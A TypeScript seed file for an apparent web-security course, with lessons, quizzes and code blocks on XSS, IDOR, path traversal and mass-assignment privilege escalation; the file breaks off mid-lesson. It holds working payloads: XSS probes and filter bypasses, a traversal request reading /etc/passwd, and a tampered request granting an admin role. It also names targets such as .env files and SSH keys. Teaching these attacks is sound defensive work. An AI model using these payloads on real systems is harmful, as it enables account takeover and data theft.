import type { ExerciseSeed, ModuleSeed } from './types';
import { videoSlot } from './types';

export const MODULES: ModuleSeed[] = [
  {
    slug: 'xss',
    title: 'Cross-Site Scripting',
    description: 'Get your own JavaScript running inside another user\'s logged-in browser, then learn every way sites try to stop it. By the end you can tell reflected, stored and DOM XSS apart, confirm each one with a payload you can trust, defeat the naive filters most sites ship, and explain why output encoding plus CSP is the real fix.',
    lessons: [
      {
        slug: 'xss-cross-site-scripting',
        title: 'XSS: The Big Picture',
        summary: 'You get the site to run your JavaScript in another user\'s browser. That is the whole game.',
        estimatedMinutes: 9,
        importance: 'essential',
        blocks: [
          videoSlot('XSS explained - how your JavaScript ends up running in someone else\'s browser'),
          {
            type: 'image',
            src: '/api/v1/diagrams/xss-types',
            alt: 'Reflected, stored and DOM XSS compared by where the payload lives',
            caption: 'Same root cause, three delivery routes.',
          },
          {
            type: 'paragraph',
            text:
              'XSS (Cross-Site Scripting) is when a site takes something you typed and prints it back onto a page without cleaning it, so the browser treats your input as code instead of text. Your JavaScript then runs inside the victim\'s browser with every scrap of trust the site has - the same cookies, the same logged-in session, the same permissions as that user.',
          },
          {
            type: 'paragraph',
            text:
              'The reason it works is that a browser has no way to tell "script the developer wrote" from "script that arrived in a comment box". Both are just text in the HTML by the time the browser parses it. If your text contains a `<script>` tag and the site did not neutralise it, the browser runs it. The diagram above shows the three routes your payload can take to get there - reflected, stored, and DOM-based - which are the same bug arriving three different ways.',
          },
          {
            type: 'paragraph',
            text:
              'Walk one through end to end. A review box saves your comment and shows it to everyone. You submit `<b>nice</b>` and the page shows a bold "nice" - that is your first clue the site renders HTML instead of escaping it. So you submit `<script>alert(document.domain)</script>` instead. The server saves it, and the response HTML now literally contains `...<div class="review"><script>alert(document.domain)</script></div>...`. Every browser that loads that page parses the tag and runs it, popping a box that reads the exact domain. Swap that alert for code that reads the session cookie and you have gone from a joke popup to account takeover with the same bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Reflected** - your input bounces straight back in the same response (a search term echoed on the results page)',
              '**Stored** - your input is saved on the server and served to other users later (a comment, a bio)',
              '**DOM-based** - the page\'s own JavaScript reads your input and writes it into the page, often without the server ever seeing it',
              '**Blind** - a stored payload that fires somewhere you cannot see, like an admin log viewer',
            ],
          },
          {
            type: 'code',
            language: 'html',
            filename: 'the-classic-test',
            code: '<script>alert(document.domain)</script>',
          },
          {
            type: 'paragraph',
            text:
              'Why `document.domain` and not `alert(1)`? Because the popup shows you exactly which origin ran the code. If you inject into `shop.example` and the box reads `shop.example`, the script is running in that site\'s context - clean, unambiguous evidence for a report. `alert(1)` only proves *something* ran; `alert(document.domain)` proves *where*. To be sure it fired and is not a false positive, confirm three things: the alert actually appeared (not just your literal text shown on the page), the domain in the box is the target\'s, and viewing the page source shows your `<script>` tag intact rather than escaped to `&lt;script&gt;`. If the source shows the escaped version, the site defended itself and there is no bug.',
          },
          {
            type: 'paragraph',
            text:
              'Impact is why this is the first lesson in the highest-value track. An XSS that fires in a logged-in user\'s browser can read anything that user can read, act as them, steal their session token, submit forms on their behalf, or key-log the page. In a report you would state which user the script runs as, what it can reach with that trust (session cookie, CSRF token, private data on the page), and whether it is reflected (needs a click) or stored (fires for everyone) - because that distinction drives the severity.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'It is a trust bug',
            text:
              'The browser cannot tell your injected script from the site\'s real script. That is exactly why XSS is so powerful - your code inherits every bit of the victim\'s trust.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test XSS on systems you own or are authorised to test. Popping an alert on a live site you do not own is still an attack.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You know what XSS is - running your code in a victim\'s browser - and the three flavours it comes in.',
          },
          {
            type: 'quiz',
            question: 'What does an XSS vulnerability let an attacker do?',
            options: [
              'Read files off the server\'s hard drive',
              'Run their own JavaScript in another user\'s browser',
              'Crash the database',
              'Bypass the login page directly',
            ],
            correctIndex: 1,
            explanation:
              'XSS runs attacker-controlled JavaScript in a victim\'s browser, inheriting that user\'s session and trust.',
          },
        ],
      },
      {
        slug: 'reflected-vs-stored-xss',
        title: 'Reflected vs Stored XSS',
        summary: 'One fires only when you trick someone into clicking your link. The other waits, saved, for every visitor.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('Reflected vs stored XSS - the difference that changes everything'),
          {
            type: 'paragraph',
            text:
              'Both reflected and stored XSS end the same way - your script runs in a victim\'s browser - but they get there differently, and that difference decides how severe the bug is, how you prove it, and how much you can expect to be paid for it.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Reflected: you need a click',
          },
          {
            type: 'paragraph',
            text:
              'In reflected XSS your payload lives in the request - a URL parameter or a form field - and the server echoes it straight back in the same response. Nothing is saved. That means the payload only fires for whoever sends that exact request, so to attack someone else you have to get them to click your crafted link. Walk it through: you visit the search page and type `test`, and the results page reads "No results for test". That echo is the tell. Now you request the URL below instead.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'reflected-example',
            code: 'GET /search?q=<script>alert(document.domain)</script>\n\nResponse (200):\n  <h2>No results for <script>alert(document.domain)</script></h2>',
          },
          {
            type: 'paragraph',
            text:
              'The response literally contains your unescaped `<script>` tag inside the `<h2>`, so the browser runs it and the domain pops. That is a confirmed reflected XSS. To be sure it is real and not a false positive, view the raw response source: your tag must appear as `<script>`, not `&lt;script&gt;`. If it is escaped, the alert will not fire and there is no bug - a page that merely *displays* your text as visible characters is behaving correctly.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Stored: it waits for them',
          },
          {
            type: 'paragraph',
            text:
              'In stored XSS your payload is saved on the server - in a comment, a profile bio, a support ticket, a chat message - and served to everyone who later views that page. There is no link to send and no click to engineer. It fires on its own for every visitor, including staff who open an admin panel, which is exactly why stored XSS usually scores higher than reflected. You confirm it the same way: post the payload once, then load the page as a *different* user (a second browser or an incognito window) and check the alert fires there too. If it runs in a session that never submitted the payload, it is genuinely stored and self-spreading, not just reflected back to you.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Reflected** - short-lived, needs social engineering, one victim per click',
              '**Stored** - persistent, self-spreading, hits everyone who loads the page',
              'Test spots for stored: comments, usernames, bios, chat, filenames, ticket subjects',
              'Test spots for reflected: search boxes, error messages, `?param=` values echoed on the page',
            ],
          },
          {
            type: 'paragraph',
            text:
              'For impact and reporting, the type is the headline. A reflected finding reads "an attacker who tricks a logged-in user into clicking this link runs script as that user" - real, but gated on a click. A stored finding reads "any user who views this page runs the attacker\'s script automatically", and if that page is an admin view, one payload can compromise a privileged account with no interaction at all. Note the affected user, whether a click is required, and where the payload persists.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Check every output, not just the obvious one',
            text:
              'Input entered in one place often shows up somewhere else - a username set at signup that appears in an admin panel. Follow where your data lands.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only plant test payloads on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can tell reflected from stored XSS and explain why stored usually hits harder.',
          },
          {
            type: 'quiz',
            question: 'Why is stored XSS usually more severe than reflected XSS?',
            options: [
              'It is harder for defenders to detect',
              'It is saved and served to every visitor without needing them to click a crafted link',
              'It works on more browsers',
              'It can read server files',
            ],
            correctIndex: 1,
            explanation:
              'Stored XSS persists and runs for anyone who views the page, so it does not depend on tricking each victim into a click.',
          },
        ],
      },
      {
        slug: 'dom-xss',
        title: 'DOM XSS',
        summary: 'Sometimes the server is innocent. The page\'s own JavaScript takes your input and writes it into the page.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('DOM XSS - when the bug never touches the server'),
          {
            type: 'paragraph',
            text:
              'DOM XSS is the odd one out: the payload may never reach the server at all. The bug lives entirely in the page\'s own JavaScript, which reads something you control - the URL, the part after the `#`, a query value - and writes it into the page in a way that turns text into live code. The server can be perfectly written and the page still be exploitable, because the dangerous step happens in the browser after the page has loaded.',
          },
          {
            type: 'paragraph',
            text:
              'The whole idea is source to sink. A **source** is any place attacker-controlled input enters the JavaScript - `location.hash`, `location.search`, `document.referrer`. A **sink** is a function that takes a string and turns it into live content or code - `innerHTML`, `document.write`, `eval`. When data flows from a source into a sink with no sanitising in between, that path is a DOM XSS. Your whole job is to find one such path and push a payload down it.',
          },
          {
            type: 'code',
            language: 'javascript',
            filename: 'vulnerable-code',
            code: '// Reads the part after # (the source) and drops it straight into innerHTML (the sink)\nconst name = decodeURIComponent(location.hash.slice(1));\ndocument.getElementById(\'greeting\').innerHTML = \'Hi \' + name;',
          },
          {
            type: 'paragraph',
            text:
              'Walk the exploit. Normally the page is loaded as `/welcome#Asha` and shows "Hi Asha". You instead load `/welcome#<img src=x onerror=alert(document.domain)>`. The JavaScript reads everything after the `#`, concatenates it into a string, and assigns it to `innerHTML`. The browser parses that string as HTML, creates an `<img>` with a broken `src`, the image fails to load, the `onerror` handler runs, and the domain pops. Notice the payload uses an `<img onerror>` and not `<script>` - HTML inserted via `innerHTML` does **not** execute plain `<script>` tags, so an event-handler payload is the right tool here. Confirming it is real vs a false positive is special for DOM XSS: because the injection happens in the browser, the payload will **not** appear in the raw HTML you get from "View Source" or a proxy - the network response is clean. You confirm by watching the alert fire and by opening DevTools, finding the assignment to `innerHTML`, and seeing your input arrive there unescaped. If your string shows up as visible text instead of firing, the code sanitised it and there is no bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Common sources** - `location.href`, `location.hash`, `location.search`, `document.referrer`',
              '**Dangerous sinks** - `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`',
              'Hash payload that survives innerHTML: `#<img src=x onerror=alert(document.domain)>`',
              'The fix-side safe sink is `textContent`, which never parses HTML',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is the same class as any other XSS - script running as the victim - but with two reporting twists worth calling out. First, because the payload often sits in the URL fragment (after `#`), it is never sent to the server and so never lands in server logs, which makes it quieter and sometimes missed by server-side WAFs entirely. Second, in your report you point at the specific source-to-sink line of JavaScript, not a server endpoint, because that is where the fix has to happen.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Read the JavaScript, not just the response',
            text:
              'DOM XSS will not show up when you view the raw HTML response, because the injection happens in the browser. Use DevTools and search the JS for sinks like `innerHTML`.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test DOM XSS on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can trace input from a source to a dangerous sink - the mindset behind every DOM XSS find.',
          },
          {
            type: 'quiz',
            question: 'What makes DOM XSS different from reflected XSS?',
            options: [
              'It only works on old browsers',
              'The injection happens in the page\'s own JavaScript, often without the server ever seeing the payload',
              'It requires a saved database entry',
              'It cannot steal cookies',
            ],
            correctIndex: 1,
            explanation:
              'DOM XSS is caused by client-side JavaScript writing a source into a sink unsafely. The payload may never reach the server.',
          },
        ],
      },
      {
        slug: 'xss-payloads-and-filters',
        title: 'Payloads and Filter Bypasses',
        summary: 'Alert boxes are cute. Real payloads steal sessions, and real filters try to stop them - badly.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          videoSlot('XSS payloads and filter bypasses - past the naive blocklist'),
          {
            type: 'paragraph',
            text:
              'Once you confirm XSS fires, two jobs remain: prove real impact instead of a toy popup, and get past whatever half-hearted filter the site put up. Most sites do not fix XSS properly - they blocklist the word "script" and call it done. That kind of filter falls apart in minutes, because JavaScript has a hundred ways to run that never spell out "script".',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Payloads that do not need the word script',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '`<img src=x onerror=alert(document.domain)>` - event handler fires when the broken image fails to load',
              '`<svg onload=alert(document.domain)>` - fires the moment the element loads',
              '`<body onpageshow=alert(document.domain)>` - another handler route if the tag lands at the top level',
              '`"><img src=x onerror=alert(1)>` - the leading `">` breaks out of an HTML attribute you landed inside first',
            ],
          },
          {
            type: 'paragraph',
            text:
              'That last one matters more than it looks. If your input is reflected inside an attribute - say `<input value="YOUR_INPUT">` - a bare `<img>` tag does nothing, because you are still trapped inside the quotes. The `">` closes the value and the tag, and only then does your `<img>` become a real element. This is why you always read the surrounding HTML before choosing a payload: the same site needs a different payload depending on exactly where your text lands.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'How weak filters get bypassed',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'filter-bypass-ladder',
            code: 'Filter blocks lowercase "script":   <ScRiPt>alert(1)</ScRiPt>\nFilter strips one "script" pass:     <scr<script>ipt>alert(1)</scr<script>ipt>\nFilter blocks < and >:               URL-encode ->  %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E\nFilter blocks onerror:               swap event ->  <svg onload=alert(1)>',
          },
          {
            type: 'paragraph',
            text:
              'Read that ladder as a decision tree, not a script. Each rung is "the site blocked X, so I switch technique Y". Case-flipping beats a filter that only matches lowercase. The nested `<scr<script>ipt>` works when the filter strips exactly one copy of the word - removing the inner `script` glues the outer halves back into a valid `<script>` tag. Encoding slips past a filter that only looks for literal `<` and `>`. And if a specific event handler like `onerror` is banned, you reach for another - `onload`, `onmouseover`, `onfocus autofocus`. You confirm each attempt exactly as before: the alert fires and the domain is the target\'s. A payload that gets stripped or shown as plain text did not work - move to the next rung.',
          },
          {
            type: 'paragraph',
            text:
              'For a serious report, graduate past `alert()`. A payload that reads `document.cookie` and sends it to a collaborator server you control demonstrates that the session can actually be stolen, which is the difference between "informational" and "high severity" on most programs. Impact you would write up: attacker-controlled script runs as the victim, the session token is exfiltrable (unless it is HttpOnly), and therefore the account is takeable - state whether a click is needed and whether the cookie carried the HttpOnly flag, because that decides if cookie theft is even possible.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Context is everything',
            text:
              'The same input needs a different payload depending on where it lands - inside an HTML tag, an attribute, a `<script>` block, or a URL. Always look at the surrounding HTML before crafting the payload.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only fire these payloads at systems you own or are authorised to test, and never exfiltrate a real user\'s cookies outside an authorised test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can write XSS payloads that dodge naive filters and prove real impact instead of a plain alert.',
          },
          {
            type: 'quiz',
            question: 'A site blocks the string "script" but reflects your input into the page. What is the smart next move?',
            options: [
              'Give up, the site is secure',
              'Use an event-handler payload like <img src=x onerror=...> that needs no <script> tag',
              'Try the same payload again unchanged',
              'Report it as unexploitable',
            ],
            correctIndex: 1,
            explanation:
              'Blocking the word "script" ignores event handlers. Payloads like <img src=x onerror=...> run JavaScript with no <script> tag at all.',
          },
        ],
      },
      {
        slug: 'csp-and-xss-defense',
        title: 'CSP and Defending Against XSS',
        summary: 'The real fix is not a blocklist. It is output encoding, plus a Content Security Policy as a safety net.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'You cannot blocklist your way out of XSS, because attackers have more payloads than any team has filters - the last lesson was a tour of exactly that arms race. The real defence has two layers: treat every piece of user data as plain text when it goes out, and add a Content Security Policy as a backstop that limits what can run even if a mistake slips through. Encoding is the fix; CSP is the seatbelt.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'The primary fix: context-aware output encoding',
          },
          {
            type: 'paragraph',
            text:
              'Encoding means converting the characters that have special meaning into their harmless display versions for the exact place the data lands. In HTML body context, `<` becomes `&lt;` and `>` becomes `&gt;`, so `<script>` arrives at the browser as visible text reading "<script>" and never as a tag. The phrase "context-aware" matters: the escaping for an HTML body differs from the escaping inside an attribute, inside a `<script>` block, or inside a URL, and using the wrong one leaves a hole. In practice you let a framework do this - React escapes by default, and template engines have an auto-escaping mode - rather than hand-rolling it.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              'Encode user data for the exact context it lands in - HTML body, attribute, JS, or URL',
              'In HTML, turn `<` into `&lt;` so it displays instead of running',
              'Use framework escaping (React, template engines) instead of hand-rolling it',
              'Avoid dangerous sinks like `innerHTML`; prefer `textContent`, which never parses HTML',
            ],
          },
          {
            type: 'heading',
            level: 3,
            text: 'The safety net: Content Security Policy',
          },
          {
            type: 'paragraph',
            text:
              'CSP is a response header that tells the browser which sources of script it is allowed to run. A strong policy refuses inline scripts entirely, so even if an attacker manages to inject a `<script>` tag or an `onerror` handler, the browser blocks it and writes a violation to the console. That is the header below: `script-src \'self\'` means "only run JavaScript served from this same origin", which quietly kills inline injected script.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'response-header',
            code: 'Content-Security-Policy: default-src \'self\'; script-src \'self\'',
          },
          {
            type: 'paragraph',
            text:
              'How to read whether a CSP actually helps: look for two poison words. If the policy contains `\'unsafe-inline\'` in `script-src`, inline injected script runs anyway and the CSP is decorative. If it contains a wildcard like `script-src *` or `https:`, an attacker can host their script anywhere and load it. A CSP without those, that names specific trusted origins, genuinely raises the bar. But it is still the second layer - a site that relies on CSP while echoing raw user input is one CSP typo away from full XSS, so you always report the missing encoding as the real bug and the weak or absent CSP as a contributing factor.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'CSP is not the fix by itself',
            text:
              'A CSP with `unsafe-inline` or a wildcard source is basically decorative. And CSP is a second layer - encoding is still the primary defence, not the header.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You know XSS is fixed with context-aware output encoding, with CSP as a safety net - not with a word blocklist.',
          },
          {
            type: 'quiz',
            question: 'What is the primary, correct fix for XSS?',
            options: [
              'Block the word "script" in all inputs',
              'Context-aware output encoding so user input is treated as text, not code',
              'Rely entirely on a Content Security Policy',
              'Disable JavaScript on the site',
            ],
            correctIndex: 1,
            explanation:
              'Encoding output for its context stops input from being interpreted as code. CSP is a valuable second layer, not the main fix.',
          },
        ],
      },
    ],
  },
  {
    slug: 'broken-access-control',
    title: 'Broken Access Control',
    description: 'The bug class that tops the payout charts: reaching data and actions that were never meant to be yours. By the end you can tell authentication from authorisation, tamper an object id to read a stranger\'s record, climb from user to admin by flipping a trusted field, and confirm each finding end to end instead of guessing.',
    lessons: [
      {
        slug: 'access-control-basics',
        title: 'Access Control Basics',
        summary: 'Authentication asks who you are. Access control decides what you are allowed to touch. Getting it wrong is the top bug class.',
        estimatedMinutes: 8,
        importance: 'essential',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Logging in proves who you are. Access control is a completely separate question the app must answer on every request: now that I know who you are, are you allowed to see or do this specific thing? When that second check is missing or wrong, a normal user reaches another user\'s data or triggers an admin-only action. That is broken access control, and it sits at the top of the bug-bounty payout charts because it is common, easy to prove, and hits data directly.',
          },
          {
            type: 'paragraph',
            text:
              'Picture a hotel. Your keycard proves you are a guest - that is authentication, and it happens once at check-in. But the card should only open your own room, and that check happens every single time you touch a door. A hotel where any guest keycard opens every room has perfect authentication (everyone is a real guest) and broken access control (the door does not check whose card it is). Almost every access-control bug is that exact shape: the identity is fine, the per-action check is missing.',
          },
          {
            type: 'paragraph',
            text:
              'Work a concrete example. You log in as a normal user and open your order history at `GET /api/orders/mine`, which correctly returns only your orders because the server filters by your session. Then you notice a second endpoint, `GET /api/orders/88214`, that fetches one order by its id. You request it with your own session cookie still attached. If it returns order 88214 even though that order belongs to someone else, the server authenticated you (your cookie is valid) but never authorised you (it did not check the order is yours). That single missing `if (order.userId !== session.userId) return 403` is the entire bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Vertical** - a normal user does something only an admin should (delete users, change roles)',
              '**Horizontal** - you reach another user\'s data at your own privilege level (their orders, their messages)',
              '**Context-dependent** - doing a valid step at the wrong time, like editing an order after it shipped',
            ],
          },
          {
            type: 'paragraph',
            text:
              'How you confirm one is real, not a false positive: repeat the request with two different accounts. Log in as user A, hit the resource, note the response. Log in as user B and hit the same resource. If B sees A\'s data, the control is broken. If B gets a `403 Forbidden` or `404`, the check is working and you have nothing. The impact you would report is direct: which data or action leaks, to whom, and at what privilege jump - reading one stranger\'s order is a horizontal leak; a normal user deleting any account is a vertical escalation and far more serious.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The golden rule',
            text:
              'Every access check must happen on the server, on every request. A hidden button or a disabled field is not a control - the server has to say no.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only probe access controls on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can tell authentication from access control, and name vertical vs horizontal privilege problems.',
          },
          {
            type: 'quiz',
            question: 'A logged-in normal user can call an endpoint that deletes any account. What kind of flaw is this?',
            options: [
              'Horizontal privilege issue',
              'Vertical privilege escalation - a user reaching an admin-only action',
              'An authentication bug',
              'A network misconfiguration',
            ],
            correctIndex: 1,
            explanation:
              'Reaching an action reserved for a higher role (admin) is vertical privilege escalation, a broken access control flaw.',
          },
        ],
      },
      {
        slug: 'idor',
        title: 'IDOR: Changing the Number',
        summary: 'Change the id in the request, get someone else\'s data. Simple, common, and it pays.',
        estimatedMinutes: 10,
        importance: 'essential',
        blocks: [
          videoSlot('IDOR explained - change one number, read someone else\'s data'),
          {
            type: 'image',
            src: '/api/v1/diagrams/idor-flow',
            alt: 'Same user requesting their own record and then another user record',
            caption: 'One number changed. The missing check is the finding.',
          },
          {
            type: 'paragraph',
            text:
              'IDOR (Insecure Direct Object Reference) is the purest broken-access-control bug. The app hands you a reference to an object - usually an id - and when you send that reference back, it returns the matching object without ever checking the object belongs to you. The diagram above shows it: the same logged-in user asks for their own record, then changes the id and asks for someone else\'s, and the server answers both because it only checks "is this a valid id?" and never "is this your id?".',
          },
          {
            type: 'heading',
            level: 3,
            text: 'How to find one',
          },
          {
            type: 'list',
            ordered: true,
            items: [
              'Log in and do something normal - open your own order, invoice or profile',
              'Watch the request in Burp; note the id in the URL, body or a parameter',
              'Send it to Repeater and change the id to a neighbouring value',
              'If you get back data that is not yours, you have an IDOR',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Walk it with a real request. You open your own invoice and Burp captures `GET /api/invoices/1024` with your session cookie, and the response is a `200` carrying your billing details. You right-click, send it to Repeater, change nothing but the number, and fire `GET /api/invoices/1025`. The tell is below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'the-tell',
            code: 'GET /api/invoices/1024   -> 200, YOUR invoice: {"id":1024,"name":"Asha","amount":4200}\nGET /api/invoices/1025   -> 200, SOMEONE ELSE: {"id":1025,"name":"Ravi","amount":9100}  <-- IDOR',
          },
          {
            type: 'paragraph',
            text:
              'Read that carefully, because the confirmation step is what separates a real finding from a false positive. A genuine IDOR returns a `200` with data that is provably not yours - a different name, a different amount, details you never entered. A `403` or `404` on 1025 means the server checked ownership and refused, so there is no bug. An empty `200` or an error object is not proof either; you must see another user\'s actual data come back. The cleanest confirmation is to check id 1025 against a second account you control and see that the leaked data matches that other account.',
          },
          {
            type: 'paragraph',
            text:
              'It is not only reads. The same missing check on a `POST`, `PUT` or `DELETE` lets you edit or delete other people\'s objects - `DELETE /api/invoices/1025` wiping a stranger\'s record is a far worse IDOR than merely viewing it. And the id is not always a tidy number in the URL: watch for it in JSON bodies, hidden form fields, and cookies, and note that ids are sometimes non-sequential. Impact to report: how many records are reachable (often the entire table by walking the ids), whether it is read-only or also write/delete, and the sensitivity of what leaks - names, addresses and payment details are a data-breach-grade finding.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'UUIDs are not a fix',
            text:
              'Swapping numeric ids for random UUIDs just makes them harder to guess - it does not add an ownership check. If a UUID leaks anywhere, the IDOR is still there.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only test IDOR on systems you own or are authorised to test. Pulling a real person\'s records without authorisation is a data breach.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can spot an object id in a request, tamper it, and confirm an IDOR end to end.',
          },
          { type: 'lab_ref', labSlug: 'invoice-portal', title: 'Try it: Invoice Portal lab' },
          {
            type: 'quiz',
            question: 'You change invoiceId=1024 to 1025 and see another customer\'s invoice. What is the root cause?',
            options: [
              'A weak password policy',
              'The server does not check that the requested object belongs to you',
              'Missing HTTPS',
              'A cross-site scripting flaw',
            ],
            correctIndex: 1,
            explanation:
              'IDOR happens because the server trusts the id without verifying ownership. The fix is a server-side ownership check on every access.',
          },
        ],
      },
      {
        slug: 'path-traversal',
        title: 'Path Traversal',
        summary: 'Feed the app ../ and walk out of the folder it meant to keep you in - straight to files it never meant to serve.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          videoSlot('Path traversal - escaping the folder with dot dot slash'),
          {
            type: 'paragraph',
            text:
              'When an app builds a file path out of your input - `?file=report.pdf` becomes `/var/www/files/report.pdf` on disk - and does not clean that input, you can inject `../` to climb out of the intended folder and reach files elsewhere on the server. That is path traversal (also called directory traversal). The bug is that the app trusts your filename to stay inside its folder, and a filename can lie.',
          },
          {
            type: 'paragraph',
            text:
              'Each `../` means "go up one directory". If the app glues your input onto `/var/www/files/`, then a filename of `../../../../etc/passwd` walks up past `files`, `www`, `var` and the root, then back down to `/etc/passwd` - a world-readable Linux file that lists user accounts and makes a perfect, harmless proof. You add a few extra `../` beyond what you strictly need because they harmlessly stop at the root, so over-climbing never hurts.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'the-payload',
            code: 'Normal:    GET /download?file=report.pdf        -> 200, the PDF\nTraversal: GET /download?file=../../../../etc/passwd -> 200, text starting:\n           root:x:0:0:root:/root:/bin/bash\n           daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
          },
          {
            type: 'paragraph',
            text:
              'Confirming it is real hinges on the response body, not the status code. A working traversal returns a `200` whose body is unmistakably a system file - `/etc/passwd` always begins with the `root:x:0:0:` line shown above, so seeing that text is proof the attack fired. A false positive looks like a `200` that returns your app\'s normal "file not found" HTML page (the server treated your payload as a missing filename), a `403`, or a `404`. The rule: you must see the *contents of a file you should never be able to reach*, not just a success code.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Linux target** - `../../../../etc/passwd` is the classic proof file',
              '**Windows target** - `..\\..\\..\\windows\\win.ini`',
              '**Encoded** - `%2e%2e%2f` if the app naively strips literal `../`',
              '**Juicy targets** - app config, `.env` files, source code, SSH keys',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact scales with what you can read. `/etc/passwd` proves the bug but is low value on its own; the real prize is application config or a `.env` file holding database credentials and API keys, or source code that reveals more bugs. In a report you state exactly which file you retrieved as proof, note whether write or include variants are possible, and flag the highest-value file reachable - "I read the app\'s `.env` and recovered live database credentials" is a critical finding, where "I read `/etc/passwd`" alone is usually medium.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Filters get bypassed',
            text:
              'Stripping `../` once is not enough - `....//` collapses back to `../` after the strip. URL-encoding and double-encoding beat naive filters too.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Stay legal',
            text: 'Only attempt path traversal on systems you own or are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can recognise a file-path parameter and test it for traversal out of its intended folder.',
          },
          {
            type: 'quiz',
            question: 'What does the sequence ../ do in a path traversal attack?',
            options: [
              'Encrypts the file being requested',
              'Moves up one directory, letting you escape the intended folder',
              'Deletes the current directory',
              'Renames the requested file',
            ],
            correctIndex: 1,
            explanation:
              '../ steps up a directory. Chaining it lets an attacker climb out of the allowed folder to reach other files.',
          },
        ],
      },
      {
        slug: 'privilege-escalation-in-apps',
        title: 'Privilege Escalation in Apps',
        summary: 'Start as a normal user, end up as admin - by flipping a role, a flag, or a hidden parameter the server trusts.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Privilege escalation is turning a low-privilege account into a high-privilege one - normal user to admin. In web apps it almost always comes down to the same mistake: the server trusts a value the client can change. A role field, an `isAdmin` flag, an account tier - if any of those come from the request instead of being looked up from the session on the server, you can rewrite them.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Where to look',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Editable role fields** - a profile update that accepts `role=admin` in the body',
              '**Hidden form values** - a `user_type` field the UI never shows but the server reads',
              '**Mass assignment** - sending extra JSON keys the API blindly saves (`{"isAdmin":true}`)',
              '**Cookies and tokens** - a `role=user` cookie you can flip to `role=admin`',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Walk the most common one, mass assignment. You open your profile settings and save a change; Burp captures a `PUT /api/users/me` carrying `{"name":"Asha","email":"asha@example.com"}`. The app framework builds the update by copying every key from your JSON straight onto the user record. So you add a key the form never showed you and forward the tampered request below.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'mass-assignment-tamper',
            code: 'Original: PUT /api/users/me\n          {"name":"Asha","email":"asha@example.com"}\n\nTampered: PUT /api/users/me\n          {"name":"Asha","email":"asha@example.com","role":"admin"}\n\nResponse: 200 {"name":"Asha","role":"admin"}   <-- the server saved role from your body',
          },
          {
            type: 'paragraph',
            text:
              'Here is the confirmation discipline, because a `200` alone is not proof. The response echoing `"role":"admin"` is a strong hint, but the real test is behavioural: log out, log back in to get a fresh session, and try to actually reach an admin-only page or action. If `GET /admin` now loads the dashboard for your account when it returned `403` before, the escalation is real. If the field was echoed but you still get `403` on admin actions, the server accepted the key cosmetically but enforces the real role elsewhere - that is a false positive, not a finding. Always prove the *new capability*, not just the changed field.',
          },
          {
            type: 'paragraph',
            text:
